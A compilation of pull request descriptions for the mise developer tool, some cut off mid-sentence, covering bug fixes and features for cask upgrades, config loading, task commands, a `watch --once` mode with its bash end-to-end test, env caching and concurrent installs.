```lua [hooks/env_keys.lua]
local ok, cache = pcall(require, "mise.cache")
if ok then
    cache.watch_files({ file.join_path(os.getenv("PWD"), "Pipfile.lock") })
end
```

`mise.cache.disable()` runs the hook every time instead. `BackendExecEnv` can return the same as `watch_files` and `cacheable` fields beside `env_vars`, as `MiseEnv` already does. `mise.cache` is a mise addition, so plugins load it with `pcall` to keep working on the vfox CLI and older mi

title: fix(brew-cask): upgrade an auto-updating app still at its recorded version
body:
`brew-cask` upgrades skip a self-updating cask when its installed app version and the cask version have a different number of dot-separated components. For example Firefox 158.0.1 installed against cask 159.0, Fantastical 4.2 against 4.2.4. These are reported as `skipped: installed app is current, newer, or incomparable`, and nothing ever upgrades them.

The comparison was ported from Homebrew's `Cask#auto_updates_bundle_outdated?`, which also treats those pairs as incomparable. But Homebrew then has a fallback that the port left out:

```ruby
# A short version still matching Homebrew's installation record means a
# different non-CSV tap version is outdated, as for casks without `auto_updates`.
return true if version.csv.one? && installed_short_version && installed_short_version == installed_version
```

This PR passes the receipt version into `app_version_outdated` and applies that fallback at the same point. Like Homebrew, it applies only when the cask version has a single candidate. The pkg-receipt path passes `None` and is unchanged.

Verified on a real machine with a build of this branch: `bootstrap packages upgrade --dry-run` now plans `firefox/159.0`, `juxtacode/1.5` and `zen/1.24b`, which were previously skipped as incomparable. An app that updated itself past its record to an incomparable version (`158.0.2` recorded as `158.0.1`) is still left alone, and a test covers that and the other edges.

* **Bug Fixes**
  * Improved upgrade detection for self-updating apps when the live app’s short version matches its installed record but differs from the package version. The fallback applies only when there is a single package version and a usable short version. Apps that have advanced beyond the recorded version, or have ambiguous comma-separated versions, are not flagged as outdated. Existing upgrade skip behavior is unchanged.

title: fix(config): load config folders that are git repositories of their own
body:
A `.config/`, `mise/` or `.mise/` directory that is a git repository of its own is now loaded as config of the directory around it, like any other config folder.

Before, a workspace like this lost its shared config as soon as `.config` was put under version control:

```text
~/code/
├── .config/        # git repo (dotfiles)
│   └── mise.toml   # [env] FOO = "bar"
└── project-1/
```

`mise env` in `~/code/project-1` no longer showed `FOO`, and `mise trust` on the file did not bring it back. The same layout without the `.git` worked. The config was dropped without any message.

## What changes

- Remove the rule that treated a `mise/`, `.mise/` or `.config/` directory with its own `.git` as a separate project (added in #14902). Its config, `conf.d` fragments and default `tasks/` directories load as the parent directory's again, and trust follows the config root as it does everywhere else.
- Replace `test_config_nested_checkout` with `test_config_git_checkout_dir`, which checks that a git-tracked `.config` and `mise` folder load from the directory and from a child directory.
- Update the trust paragraph in `docs/security.md`.

## Compatibility

A repository cloned into a trusted directory as `mise/`, `.mise/` or `.config/` now gets that directory's trust if it ships a matching config file. This is the same model as a `git pull` changing a trusted project's `mise.toml`. Paranoid mode's `config` category binds trust to each file for anyone who wants it.

Fixes #15223

title: test(brew): run the cask tests from a checkout under /tmp, and skip shim tests without a working ruby
body:
`cargo test --workspace` failed `brew::cask` tests on two setups where nothing was wrong with the code:

- **A checkout under `/tmp`.** All 32 `brew::cask` tests failed with `brew-cask: refusing operation through untrusted directory /tmp`. The cask code refuses to work through a world-writable directory, which is correct, since real app directories never are one. The test harness already keeps its home under the crate for that reason, but under `/tmp` the crate itself has `/tmp` above it.
- **A `ruby` on PATH that doesn't run.** Six cask shim tests skip only when there is no `ruby` at all. A version manager's shim with no version set, or one that fails in the test's environment, made them fail instead of skip. In my case it was mise's own `ruby` shim, which errored on an untrusted global `config.local.toml`.

**Change** (tests only):
- **The harness picks a home with no world-writable directory above it:** the crate's `test/` as before, or for a checkout under `/tmp`, `$HOME/.cache/mise-system-packages-tests`.
- **The shim tests skip unless Ruby works:** they run only when `ruby -e 'exit 0'` succeeds, the same check `cask_ruby_bin` already makes before using a Ruby.

**Validation:**
- **Under `/tmp`:** with a checkout under `/tmp`, `cargo test --workspace brew::cask` went from 32 failed to 359 passed.
- **The usual place:** in a checkout under `~/src`, it passes too, with the six shim tests skipped while `ruby` can't run.
- **Clippy:** with `--all-features --all-targets -- -D warnings`, it passes. Its one warning, an unused `junction` in `mise-util`, is already on main.

**Limit:** when `$HOME` is under `/tmp` too, as in some sandboxes, the cask tests still fail, because nothing writable is left outside a world-writable directory.

title: chore: add Entire's StopFailure hook for Claude Code
body:
`entire status` warns "Claude Code hooks out of date · run 'entire enable --force'" in this repository. Entire CLI 0.11.x added a `StopFailure` hook for Claude Code, which this repository's `.claude/settings.json` doesn't have yet.

This adds that hook, exactly as `entire enable --force --agent claude-code` writes it. It's the same `sh -c 'if ! command -v entire …; then exit 0; fi; exec entire hooks claude-code stop-failure'` form as the existing Entire hooks, so it does nothing where `entire` isn't installed. `entire enable --force` also re-sorts `.entire/settings.json` and `.claude/settings.json`; those reorderings are left out, so the diff is only the new hook. After the change, `entire status` on this branch no longer shows the warning.

title: fix(deb): stop apt repository metadata from being cached for a day
body:
`sudo apt update` can fail against `https://mise.jdx.dev/deb` with:

```
Err:11 https://mise.jdx.dev/deb stable/main amd64 Packages
  File has unexpected size (374 != 375). Mirror sync in progress?
```

The files under `deb/dists/` (`InRelease`, `Release`, `Packages`, `Packages.gz`) sit at fixed URLs and are replaced on every release, but they were uploaded with `max-age=86400,s-maxage=86400,public,immutable`. A CDN edge that still held the previous `Packages.gz` could serve it next to the new `InRelease`, whose hashes and sizes no longer match, and apt rejects the index. The `immutable` flag also tells caches never to revalidate.

This changes the publish step so that:

- `dists/` metadata is cached for 5 minutes (`max-age=300,s-maxage=300,public`) and no longer marked `immutable`, so a stale mismatch heals itself quickly.
- The `Packages`/`Packages.gz` indexes are uploaded first and `InRelease`, `Release` and `Release.gpg` last, so a new `InRelease` is never live before the indexes it describes.

`deb/pool/` packages stay on the week-long immutable cache since their filenames carry the version.

Verified the two `aws s3 cp --dryrun` filter sets against a fake `dists/` tree: the first uploads only the `Packages*` files, the second only the three Release files. The live repository is consistent right now (`InRelease` and `Packages.gz` both report 375 bytes), so the reporter's failure was a transient stale edge; the cache headers on the next release are what this change fixes. Not tested against a real release publish.

Fixes #15218

title: fix(task): export daemon variables to monorepo tasks run from the root
body:
A daemon with an automatic port exports `<NAME>_PORT` to its project's environment. That worked for `mise exec` in the subproject, but a task run from the monorepo root did not get it:

```toml
# subproject/mise.toml
[daemons.api]
run = "unused"
port = { auto = true, base = 3000 }

[tasks.print-port]
run = 'printf "API_PORT=<%s>\n" "$API_PORT"'
```

```console
$ mise -C subproject exec -- printenv API_PORT
3000
$ mise run //subproject:print-port      # before
API_PORT=<>
$ mise run //subproject:print-port      # after
API_PORT=<3000>
```

A monorepo task resolves its environment from the subproject's own config hierarchy, which only read each file's `[env]`; daemon exports were merged for the current project only. The hierarchy's daemons are now loaded too, at the lowest precedence as in a normal project, so an explicit `[env]` value for the same key still wins. No workaround such as `shell = "mise exec -- sh -e -c"` is needed.

The same hierarchy env is used to select a task's secrets source, so that path sees the daemon variables too.

Tested with a new e2e test (`test_task_monorepo_daemon_env`) covering an auto port, a fixed port and an `[env]` override, plus the existing monorepo task e2e tests. I did not run the new test against the unfixed binary.

Fixes https://github.com/jdx/mise/discussions/15216

title: feat(tasks): add tasks set and rm, choose the file, and report changes as JSON
body:
`mise tasks add` could only write to the nearest `mise.toml`, silently replaced a task with the same name, and printed nothing. There was no way to change or remove a task without opening an editor. Scripts and tools that manage a project's tasks, like agent toolkits that suggest a task for a command you keep retyping, had no safe, non-interactive way to do it. This PR adds that.

### Choose the file: `--env`, `--global`, `--path`

`mise tasks add`, `set` and `rm` take the same write-target flags as `mise use`, resolved by the same code:

```sh
mise tasks add --env local lint -- npx eslint .   # mise.local.toml, kept out of git
mise tasks add -e staging smoke -- ./smoke.sh      # mise.staging.toml
mise tasks add --global notes -- vim ~/notes.md    # ~/.config/mise/config.toml
mise tasks add --path sub/mise.toml build -- make  # an explicit file or directory
```

The task's own environment variables use `--env-var` (see below), because `--env` already means "which file" on `mise use`.

### More fields: `--env-var`, `--tools`, `--usage`, `--confirm`

```sh
mise tasks add --env local deploy --env-var STAGE=prod --tools node@24 --tools npm:@scope/pkg@1 \
  --usage 'arg "<target>"' --confirm "Deploy now?" -- ./deploy.sh
```

```toml
[tasks.deploy]
confirm = "Deploy now?"
env = { STAGE = "prod" }
tools = { node = "24", "npm:@scope/pkg" = "1" }
usage = 'arg "<target>"'
run = "./deploy.sh"
```

`--tools` splits `TOOL@VERSION` the way `mise use` does (scoped npm names keep their `@`), and writes `latest` when there is no version. A repeated `--env-var` or `--tools` key keeps the last value. With `--file`, the same flags become `#MISE env={…}`, `#MISE tools={…}`, `#MISE confirm=…` and `#USAGE` lines.

### Change a task: `mise tasks set`

`mise tasks set TASK [field flags] [-- run]` updates only the given fields of an existing TOML task and keeps the rest of the file, including comments:

```sh
mise tasks set build --description "Build for release" --unset hide -- cargo build --release
mise tasks set test --env-var RUST_BACKTRACE=1   # adds one entry to the task's env table
```

List flags such as `--depends` replace the whole list. `--env-var` and `--tools` add or replace single entries in the existing `env`/`tools` table. `--unset FIELD` removes a field, and is checked against the task schema. A `name = "cmd"` shorthand task becomes a table.

I chose a separate `set` command over `add --merge`. `mise set`, `mise config set` and `mise settings set` already mean "change a value in place", while `add` creates. `set` also fails when the task does not exist, which catches typos that `add --merge` would turn into new tasks.

### Remove a task: `mise tasks rm` (alias `remove`)

```sh
mise tasks rm build lint
mise tasks rm --env local --yes scratch
```

This removes a TOML task's table from the file that defines it, or deletes a file task's script. It asks first unless `--yes`/`MISE_YES=1`, and fails without a terminal to ask on. `--path` can name a file task's s

title: feat(watch): add --once to wait for a change, run the tasks, and exit
body:
Scripts and coding agents often need to wait until a file changes, run a task once, and get its result. `mise watch` couldn't do that because it never exits, so callers wrote their own sleep-and-poll loops. `mise watch --once` now does it:

```sh
mise watch test --once && echo "tests pass after the change"
```

With `--once`, mise:

- runs nothing at start;
- waits until one of the watched sources changes, using the same paths and filters as a normal `mise watch` (the tasks' `sources` and those of their dependencies, `--watch`, `--exts`, `--filter`, `--debounce` and the rest);
- runs the tasks once with `mise run` and exits with their status. A task that exits 3 makes `mise watch --once` exit 3, and a task killed by a signal gives 128 plus the signal number.

`--once` implies `--postpone`, and passing `--postpone` as well changes nothing. To run now and then once more after a change, use `mise run build && mise watch build --once`.

Other exits:

- watchexec missing: the existing install hint, exit 1.
- watchexec stops before anything changes: `watchexec exited with … before any watched file changed`, exit 1.
- Ctrl-C: 130. SIGTERM, SIGHUP or SIGQUIT while waiting stops watchexec and runs nothing. During the run they go to the process group of the nested `mise run` and every task it started, `raw = true` tasks included. When stdin is not a terminal, that `mise run` gets its own process group, isolated the same way mise isolates task commands. Either way mise then exits the way the signal would have ended it (143 for SIGTERM).
- Flags that only set how watchexec runs the command (`--restart`, `--clear`, `--on-busy-update`, `--signal`, `--shell`, `--delay-run`, `--stdin-quit`, `--emit-events-to` and similar) are refused with `--once` instead of being silently ignored. `--watchexec-env` still reaches the tasks.

### `--exit-on-error`

`mise watch` now passes watchexec's `--exit-on-error` through. A normal watch then stops at the first failed run and exits with that run's status, where before it exited 1 with `command watchexec exited with …`. Needs watchexec 2.5.0 or later.

### Why not watchexec's `-1`

watchexec has a hidden `-1` flag ("exit after the first run"). Its help says it is for testing only, and it handles signals in ways a caller can't work with. Measured with watchexec 2.8.0:

- `watchexec -1 --postpone`: a SIGTERM while waiting **runs the command**, then exits 0.
- During the run, SIGTERM is ignored until the command finishes, and a command killed by a signal is reported as exit 0.

So with `--once`, watchexec runs with `--only-emit-events --emit-events-to json-stdio`, keeping the same filters. mise reads its first event line, stops watchexec, and runs `mise run` itself. A caller's timeout or cancel therefore works at any point.

### Testing

- New e2e `e2e/cli/test_watch_once`:
  - nothing runs at start, and a file outside `sources` doesn't trigger a run;
  - touching a source runs the task once and the exit code (3) comes back, with

@@ -0,0 +1,141 @@
+#!/usr/bin/env bash
+
+# `mise watch --once` runs nothing at start, waits for a watched source to
+# change, runs the task once, and exits with the task's status.
+#
+# Slow runners can start watchexec late, so the source is touched again every
+# second until mise exits rather than once after a fixed sleep. Repeated
+# touches cannot add runs: mise has stopped watching after the first.
+
+mise use -g watchexec@latest
+mkdir -p src
+cat <<'EOF' >mise.toml
+[tasks.build]
+run = 'echo "ran build FOO=$FOO"; exit 3'
+sources = ["src/**/*.txt"]
+
+[tasks.ok]
+run = 'echo "ran ok"'
+sources = ["src/**/*.txt"]
+
+[tasks.slow]
+run = 'sleep 120 & echo $! >"$HOME/slow.pid"; echo "ran slow"; wait'
+raw = true
+sources = ["src/**/*.txt"]
+
+[tasks.stubborn]
+run = 'trap "" INT; echo $$ >"$HOME/stubborn.pid"; exec sleep 120'
+raw = true
+sources = ["src/**/*.txt"]
+EOF
+
+# A killed task is reparented, and a zombie still answers `kill -0` until
+# something reaps it; containers often run an init that never does.
+process_running() {
+  local stat
+  stat="$(ps -o stat= -p "$1" 2>/dev/null)" || return 1
+  [[ $stat != Z* ]]
+}
+
+# Start the task, touching its source until it writes its pid file.
+start_task() {
+  local task=$1
+  rm -f "$HOME/$task.pid"
+  mise watch "$task" --once >"$output_file" 2>&1 &
+  pid=$!
+  for _ in $(seq 1 60); do
+    [ -s "$HOME/$task.pid" ] && return
+    touch src/changed.txt
+    sleep 1
+  done
+  fail "the $task task did not start: $(tr -d '\0' <"$output_file")"
+}
+
+# Fail if the task's process outlives the watch.
+assert_task_stopped() {
+  local task_pid
+  task_pid=$(cat "$HOME/$1.pid")
+  for _ in $(seq 1 20); do
+    process_running "$task_pid" || return 0
+    sleep 0.5
+  done
+  kill -KILL "$task_pid"
+  fail "the $1 task kept running after $2"
+}
+
+output_file="$HOME/.watch_once_output"
+runs() { tr -d '\0' <"$output_file" | grep -c "^ran $1" || true; }
+
+# Touch the source until mise exits, then leave its status in $status.
+touch_until_exit() {
+  local pid=$1
+  for _ in $(seq 1 60); do
+    kill -0 "$pid" 2>/dev/null || break
+    touch src/changed.txt
+    sleep 1
+  done
+  kill -0 "$pid" 2>/dev/null && fail "mise watch --once did not exit: $(tr -d '\0' <"$output_file")"
+  status=0
+  wait "$pid" || status=$?
+}
+
+# The task's status, 3, is mise's status, and --watchexec-env reaches the task.
+mise watch build --once --debounce 100ms --watchexec-env FOO=bar >"$output_file" 2>&1 &
+pid=$!
+sleep 2
+[ "$(runs build)" = 0 ] || fail "--once ran the task before any change: $(tr -d '\0' <"$output_file")"
+# A file the sources do not match changes nothing.
+touch src/ignored.md
+sleep 2
+kill -0 "$pid" 2>/dev/null || fail "src/ignored.md ended the watch: $(tr -d '\0' <"$output_file")"
+touch_until_exit "$pid"
+assert "echo $status" "3"
+assert "echo $(runs build)" "1"
+assert_contains "cat $output_file" "ran build FOO=bar"
+
+# --postpone is implied, so passing it too behaves the same; a passing task exits 0.
+mise watch ok --once --postpone --debounce 100ms >"$output_file" 2>&1 &
+pid=$!
+sleep 2
+[ "$(runs ok)" = 0 ] || fail "--once --postpone ran the task before any change: $(tr -d '\0' <"$output_file")"
+touch_until_exit "$pid"
+assert "echo $status" "0"
+assert "echo $(runs ok)" "1"
+
+# SIGTERM while waiting ends the watch without running the task.
+mise watch ok --once >"$output_file" 2>&1 &
+pid=$!
+sleep 2
+kill -TERM "$pid"
+status=0
+wait "$pid" || status=$?
+assert "echo $status" "143"
+assert "echo $(runs ok)" "0"
+
+# SIGTERM during the run reaches the task's whole process tree, also for a raw
+# task, which the nested `mise run` does not pass signals on to itself.
+start_task slow
+kill -TERM "$pid"
+status=0
+wait "$pid" || status=$?
+assert "echo $status" "143"
+assert_task_stopped slow SIGTERM
+
+# A SIGINT that the task ignores ends the watch with 130, and mise still stops
+# the task on the way out.
+start_task stubborn
+kill -INT "$pid"
+status=0
+wait "$pid" || status=$?
+assert "echo $status" "130"
+assert_task_stopped stubborn SIGINT
+
+# Flags that set how watchexec runs the command have no use with --once.
+assert_fail_contains "mise watch ok --once --restart --clear" "--once cannot be combined with --clear, --restart"
+
+# --exit-on-error stops a normal watch at the first failed run, here the run at
+# start, and mise exits with its status.
+status=0
+run_with_timeout 60 mise watch build --exit-on-error >"$output_file" 2>&1 || status=$?
+assert "echo $status" "3"
+assert "echo $(runs build)" "1"

title: fix(core): fold AppleDouble sidecars into their files when extracting tars on macOS
body:
Signed `.app` bundles installed from a bsdtar-made tarball on macOS were killed on launch, because mise extracted their `._*` AppleDouble files as plain files. mise now folds those sidecars into the files they describe, as macOS `tar` does, and deletes them.

Before, with `github:zenbu-labs/terminal-browser@0.15.2`:

```sh
find "$(mise where github:zenbu-labs/terminal-browser@0.15.2)" -name '._*' | wc -l   # 228
codesign -v --deep --strict .../terminal-browser.app   # a sealed resource is missing or invalid
.../bin/terminal-browser --version                     # Killed: 9
```

After, no `._*` files remain and the xattrs (here the `com.apple.cs.*` signatures) sit on the files themselves.

## Cause

The issue reports that the archive holds no `._*` entries. It does: bsdtar on macOS stores each file's xattrs as a `._<name>` AppleDouble entry, next to the pax xattr headers. macOS `tar` merges them with `copyfile(3)` while extracting. jdx-tar (like GNU tar) writes them out as ordinary files, which end up as extra files inside the signed bundle and break its seal.

## Fix

- `untar` notes whether the archive had any `._*` entry, and only then, on macOS, walks the destination after stripping components.
- Each `._<name>` that begins with the AppleDouble magic and has a sibling `<name>` is applied with `copyfile(..., COPYFILE_UNPACK | NOFOLLOW | ACL | XATTR)`, then removed.
- A sidecar that is not AppleDouble, has no sibling, or fails to apply is left in place (the failure warns), so nothing is lost relative to today.
- Linux and Windows are unchanged.

## Testing

- New test that a `._*` file that isn't AppleDouble is kept (all platforms).
- New macOS-only test that a valid sidecar is folded in and removed. I could only run Linux here, so it has not run on a Mac. I type-checked the `copyfile` call against `aarch64-apple-darwin`, but have not run the macOS path, so the reporter's repro on a Mac is the real check.
- `cargo clippy -p mise-util --all-targets -- -D warnings` and the `file::tests` suite pass.

Fixes #15209

title: fix(dotfiles): don't drop earlier tracking when a later untrack path fails
body:
`mise dot untrack` with several paths could fail partway through. If a later path had never been tracked, the command exited 1 but had already removed the earlier paths' tracking declarations, so those files silently stopped being captured:

```console
$ mise dot untrack ~/.example ~/.never-tracked
mise dotfiles: ~/.example removed from ~/.config/mise/config.toml
mise ERROR ~/.never-tracked is not tracked
$ mise dot save
mise history: saved checkpoint 2: removed ~/.example
```

`untrack` now validates every target before changing anything. A later path that is not tracked (or whose declaration mise cannot read) fails the command with the same error as before, and the earlier paths stay tracked with their config unchanged.

Relative paths and invalid exclusion patterns were already checked up front; the "not tracked" and "declaration cannot be read" checks ran inside the editing loop, which is what this moves.

Fixes #15206

## Validation

Extended `e2e/cli/test_dotfiles_review_invalid_global_exclude` to untrack a tracked child and a tracked directory together with a never-tracked path, asserting the config file and history HEAD are unchanged. The related dotfiles e2e tests (`include_list`, `track_local`, `track_local_edges`, `explicit_tracking`) pass.

title: fix(shim): stop reshim from scaling quadratically with tracked configs
body:
`mise reshim` (and the reshim at the end of `mise install`) could spin on CPU for minutes on machines that have seen many projects. With about 2000 tracked configs of ~30 tools each, a reshim from an unrelated directory took ~90 s; a CI runner timed out after `mise install --locked` had already printed its summary.

The cause was in `tracked_command_wrappers`: for every tracked config it re-filtered the tool requests of *all* tracked configs for the `mr-boxington` provider, so the filter ran N·(N·k) times. The `mr-boxington` requests are now collected once, so the work is linear in the number of tracked configs.

Measured with 1500 tracked configs of 30 tools each, from an unrelated directory, on a debug build: `mise reshim` takes 2.5 s.

Fixes #15202

title: registry: add jouet
body:
Adds [jouet](https://github.com/jdx/jouet), jdx's toolkit CLI for coding agents, so it installs by name:

```sh
mise use -g jouet
jouet edit --help
```

The entry installs from jouet's signed packslip, pinned to the workflow that signs its releases (`release.yml` on `main`). GitHub releases, with their build attestations required from 0.0.1, are the fallback.

Checked locally:
- `mise test-tool jouet` passes with a debug build of this branch: it installs 0.0.1 through the packslip backend and `jouet --version` prints `jouet 0.0.1`. This holds with the default 24-hour minimum release age as well as with it off.
- `mise ls-remote packslip:github.com/jdx/jouet` lists 0.0.1.
- Pinning the packslip to another workflow (`release-plz.yml`) is refused: `identity mismatch … got https://github.com/jdx/jouet/.github/workflows/release.yml@refs/heads/main`.
- `github:jdx/jouet@0.0.1` installs, and `gh attestation verify` passes for the release assets.

- GitHub: 1 star, 0 forks; created and first released (v0.0.1) on 2026-10-30

title: feat(env): add env_cache_redacted to cache environments with redacted values
body:
With `env_cache = true`, a config containing a `redact = true` directive is never written to the env cache, so a slow `_.source` script reruns on every prompt (#15191). That is deliberate: it keeps secrets out of the cache (#13950). But `redact` is often used just to mask a value in logs, and the cost is silent.

This adds an opt-in setting, `env_cache_redacted` (default `false`, `MISE_ENV_CACHE_REDACTED=1`), that lets those environments be cached:

```toml
[settings]
env_cache = true
env_cache_redacted = true

# mise.toml
[env]
_.source = { path = "env.sh", redact = true, tools = true }
```

With both on, the first `mise env` runs `env.sh` and writes the cache. Later commands read the cache and skip the script, and the sourced values are still masked in task output and logs.

## Tradeoff

With this on, the cache file holds the secret values on disk, encrypted with a key that `mise activate` puts in its shell's environment. Every process started from that shell inherits the key and can decrypt the file. After `env_cache_ttl` mise stops using an entry, but the file stays until mise loads it again or `mise cache clear` runs. That is why it is off by default. Never cached, whatever the setting says: `age` and sops values, plugin results with `cacheable = false`, redacted `[vars]`, and redacted `default` and `required` directives (their values depend on inputs the cache key does not cover).

## Details

- The tool-aware pass's redaction key names (never values) are stored in the cache and re-applied on a hit. Without that, a hit would return `tools = true` values unmasked.
- The setting is part of the cache key, so an entry built with it on is not read with it off.
- When an environment is not cached because of an uncacheable directive, mise now says so at debug level (`MISE_DEBUG=1`). The trace in #15191 gave no hint.

## Testing

New e2e test `env/test_env_cache_redacted` covers: off means no cache file and the script runs on every command; on means one cache file and one script run across several commands; a cache hit still masks the values in task output; an entry built with the setting on is not reused with it off. Removing the re-masking on load makes it fail. Existing env-cache, plugin and age e2e tests pass, as do clippy and the lint hooks.

Fixes #15191

title: fix(bootstrap): report an annotated tag ref as current once checked out
body:
A `[bootstrap.repos]` entry whose `ref` names an annotated tag always reported `differs`, even when HEAD was the tagged commit. `mise bootstrap repos status --missing` exited 1, and every `mise bootstrap repos apply` checked the tag out again. Lightweight tags were unaffected.

```toml
[bootstrap.repos]
"~/zsh-syntax-highlighting" = { url = "https://github.com/zsh-users/zsh-syntax-highlighting.git", ref = "0.8.0" } # annotated tag
```

Before:

```console
$ mise bootstrap repos apply --yes
$ mise bootstrap repos status
~/zsh-syntax-highlighting  https://github.com/zsh-users/zsh-syntax-highlighting.git  0.8.0  differs
```

After, the same status reports `current`, `--missing` exits 0, and `apply` leaves the checkout alone.

## Cause

`ref_is_current` confirms the ref against the remote with `git ls-remote origin refs/tags/<tag>`. With an exact pattern, `ls-remote` prints only the tag object, not the peeled `refs/tags/<tag>^{}` line, so HEAD was compared with the tag object's SHA and never matched. The parser already preferred the peeled line, but the command never returned it. The command now asks for `<ref>` and `<ref>^{}` together.

## Testing

- New unit test `annotated_tag_is_current_at_the_tagged_commit`, which fails without the fix.
- `e2e/cli/test_bootstrap_repos` now applies an annotated tag and checks that status is `current`, `--missing` succeeds, and a dry-run `apply` does no checkout.

Fixes #15189

title: feat(bootstrap): report which tool manages each installed cask in status --json
body:
`mise bootstrap packages status --json` reported a cask Homebrew installed the same way as one mise installed: both `installed`. `apply` and `upgrade` treat them differently (mise leaves a Homebrew-installed cask alone), so scripts reading the JSON couldn't tell which casks mise would manage.

Installed `brew-cask` packages now carry a `managed_by` field in `mise bootstrap packages status --json` and in the `packages` section of `mise bootstrap status --json`:

```json
{
  "package": "firefox",
  "requested_version": "latest",
  "desired_state": "present",
  "state": "installed",
  "installed_version": "150.0",
  "auto_updates": true,
  "managed_by": "homebrew"
}
```

- `"mise"`: mise installs and upgrades it. `macos-app` entries always report this.
- `"homebrew"`: Homebrew's metadata exists for the cask, so mise counts it as installed and leaves it unchanged (the "installed and managed by Homebrew; leaving unchanged" message from `apply --dry-run`/`upgrade --dry-run`).
- `"unknown"`: the decision couldn't be determined, for example when Homebrew's records can't be read.

The field is omitted for missing or unavailable packages and for other managers. It says nothing about self-updating apps, which `auto_updates` still reports separately. The table output is unchanged. The decision reuses the Homebrew-metadata check that install and upgrade already use, and `docs/bootstrap/packages/brew-cask.md` documents the field.

Validated with a unit test covering the three outcomes, plus `cargo clippy --workspace --all-features --all-targets -- -D warnings`. I haven't run it against a real Homebrew install.

title: fix(lock): write a symlinked config dir's lockfile as one target
body:
Fixes the lockfile flipping between full and empty on every other `mise install` when `~/.config/mise` is a symlink into a dotfiles checkout (for example via `--config-dir`) and the command runs from inside that checkout. It needs a `config.override.toml` in the config directory.

Reported in https://github.com/jdx/mise/discussions/15193.

```sh
ln -s ~/dotfiles/.config/mise ~/.config/mise
touch ~/dotfiles/.config/mise/config.override.toml
cd ~/dotfiles
mise install   # mise.lock has the tools
mise install   # mise.lock now has an empty [tools] table
mise install   # and back again
```

## Cause

Inside the checkout, `config.toml` is found by walking up the tree under its real path, while `config.override.toml` is read from the global config dir under the symlinked path. Both map to the same `mise.lock`, but under two different spellings, so `get_lockfile_targets` made two targets. The override target has no tools and pruned every entry the `config.toml` target had just generated; because only one of them staged a change on a given run, the file alternated.

## Fix

`get_lockfile_targets` now folds lockfile paths that differ only by a symlinked directory into one target (using the existing `same_file_path`). The places that match a tool's source lockfile against a target compare the same way, so tools from `config.toml` still belong to the merged target regardless of which spelling it carries.

## Test

`e2e/lockfile/test_lockfile_symlinked_config_dir_override` runs `mise install` four times in the reproduction layout and checks the lockfile keeps its entry each time. It fails without the change.

title: fix(install): stop concurrent installs from reading a half-created install as complete
body:
Several `mise install` processes started at once (parallel git hooks, scripts) could fail with a false error even though nothing was wrong:

```
mise ⇢ python@3.15.1    0ms · already installed
mise ✗ pipx:cowsay@6.1  4ms · failed: Python graph installs require an installed interpreter; run `mise install python`
```

A late process read `python` as installed while another process was still creating it, dropped it from its work list, and so `pipx:` had nothing to wait for. A rerun passed.

The cause is an ordering gap in `create_install_dirs`: the install directory was created before the incomplete marker was written, and the work list `mise install` builds takes no lock, so a check in between saw a directory with no marker and took it for a complete install. The same applies while a force reinstall removes the old tree.

Now the marker is written first, before any directory is created, and `uninstall` (also used by a forced reinstall) marks the version before it starts removing the old install, so a lock-free check never sees an unmarked directory in either direction. A process that finds the version incomplete keeps it on its work list and waits for the install lock, as it already does for other tools. If setup fails partway, a half-made directory stays marked incomplete instead of reading as installed; if it fails without leaving a directory (for example an explicit `install-into` destination that cannot be created), the marker is cleared again so a working install of the same version is not hidden.

Reported in discussion #15190, which has an 8-process repro (about 14% of runs on macOS arm64).

## Validation

- New unit tests: a setup that fails after the install dir is created leaves the marker, and one that fails without a directory leaves none.
- `cargo fmt --check` and `cargo clippy --lib --tests -- -D warnings` are clean.
- I did not run the discussion's 8-process repro. The reporter saw a rate higher than this small window would explain, so there may be a second path; the repro against this branch would show whether any failures remain.

title: fix(dotfiles): keep saving a directory tracked in place of narrower paths
body:
Tracking a directory in place of the narrower paths inside it no longer stops autosave for that directory.

Before, with `~/.agents/skills/alpha` and `~/.agents/skills/beta` tracked and an origin synced, changing the config to track the parent instead left it stuck:

```toml
[dotfiles]
"~/.agents/skills" = { mode = "track" }
```

```console
$ mise dot status
⚠ not applied here: ~/.agents/skills (saved by another machine while not selected here); saves resume after a pull applies them
$ mise dot pull
mise history: nothing to apply
```

This machine wrote that version under the old entries, so no pull could ever apply it, and edits under the path were never saved. Now the parent is saved like any other tracked path, including files the narrower entries did not cover.

The cause was that a newly selected entry is held only if its live files exactly match what was saved. A file the parent now covers but nothing saved made that comparison fail. The check now requires every saved file the entry owns to still be live and unchanged. A live file with no saved version is accepted as an addition only if the history never saved that exact path; one it saved and no longer has was deleted by another machine, and saving it would revert that deletion. A saved file that is missing or edited still keeps the entry unheld, so the profile-inactive-at-adoption protection from #14275 is unchanged.

Fixes #15186

## Testing

- New unit test in `held.rs` covering additions, edits, missing files and the deletion case.
- New e2e `test_dotfiles_widen_tracked_directory`: widens two tracked children to their parent with an extra loose file, then checks save, status and sync. It fails on the previous code with the "not applied here" status.
- New e2e `test_dotfiles_profile_remote_deletion`: a file another machine deleted from a profile directory is not re-saved when the profile is selected again.
- `test_dotfiles_profile_variant_sync`, `test_dotfiles_incoming_enrollment` and `test_dotfiles_manifest_enrollment` still pass; workspace clippy is clean.

Reported by @drewbitt in #15186.
